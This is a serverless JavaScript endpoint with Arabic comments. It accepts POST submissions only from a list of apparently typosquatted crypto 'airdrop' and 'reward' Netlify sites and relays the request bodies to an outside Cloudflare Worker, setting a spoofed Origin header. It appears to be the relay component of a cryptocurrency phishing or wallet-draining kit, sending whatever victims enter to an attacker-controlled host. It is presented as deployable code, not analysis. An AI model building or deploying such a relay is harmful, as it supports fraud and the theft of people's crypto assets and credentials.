// api/submit.js

// الأصول المسموح بها
const STRICT_ORIGINS = [
  "https://big-airdrop.netlify.app",
  "https://reward-ethdefreum.netlify.app",
  "https://frdees-vip.netlify.app",
  "https://reward-ethdereum.netlify.app",
  "https://free-vdip.netlify.app",
  "https://freefd-vip.netlify.app",
  "https://free-chances.netlify.app",
  "https://free-vfdip.netlify.app",
  "https://q-ethds.pagdes.dev"
];

// أصول التطوير (اختياري)
const EXTRA_DEV_ORIGINS = [
  "http://localhost:3000",
  "http://localhost:5173",
  "http://127.0.0.1:5500",
  "http://127.0.0.1:8080"
];

const FALLBACK_ORIGIN = "https://big-airdrop.netlify.app"; // 👈 تثبيت عند غياب Origin/Referer
const ALLOWED_ORIGINS = [...STRICT_ORIGINS, ...EXTRA_DEV_ORIGINS];

// رابط الـ Worker
const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

function originFromReferer(referer = "") {
  try {
    if (!referer) return "";
    const u = new URL(referer);
    return `${u.protocol}//${u.host}`;
  } catch { return ""; }
}

function corsHeaders(origin) {
  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Vary": "Origin"
  };
}

export default async function handler(req, res) {
  // استخرج origin أو اشتقه من referer أو استخدم FALLBACK_ORIGIN
  const reqOrigin = req.headers.origin || "";
  const referer = req.headers.referer || "";
  let derivedOrigin = reqOrigin || originFromReferer(referer) || FALLBACK_ORIGIN;

  // DEBUG GET: يساعد في التشخيص عند الفتح المباشر
  if (req.method === "GET") {
    return res.status(200).json({
      hint: "Use POST from your site",
      origin: reqOrigin || null,
      referer: referer || null,
      derivedOrigin,
      allowed: ALLOWED_ORIGINS
    });
  }

  // Preflight
  if (req.method === "OPTIONS") {
    if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
      return res.status(403).json({ error: "Forbidden origin (preflight)", got: derivedOrigin });
    }
    return res.status(200).set(corsHeaders(derivedOrigin)).send("ok");
  }

  // السماح فقط بـ POST ومن أصل مسموح
  if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
    return res.status(403).json({ error: "Forbidden origin", got: derivedOrigin });
  }
  if (req.method !== "POST") {
    return res.status(405).set(corsHeaders(derivedOrigin)).json({ error: "Method Not Allowed" });
  }

  try {
    // مرر الطلب إلى الـ Worker واضبط Origin كما يريد الـ Worker للتحقق
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Origin": derivedOrigin
      },
      body: JSON.stringify(req.body)
    });

    const text = await response.text();
    let payload;
    try { payload = JSON.parse(text); } catch { payload = { raw: text }; }

    return res
      .status(response.status)
      .set(corsHeaders(derivedOrigin))
      .json(payload);
  } catch (err) {
    return res
      .status(500)
      .set(corsHeaders(derivedOrigin))
      .json({ error: "Failed forwarding request", details: err?.message || "unknown" });
  }
}
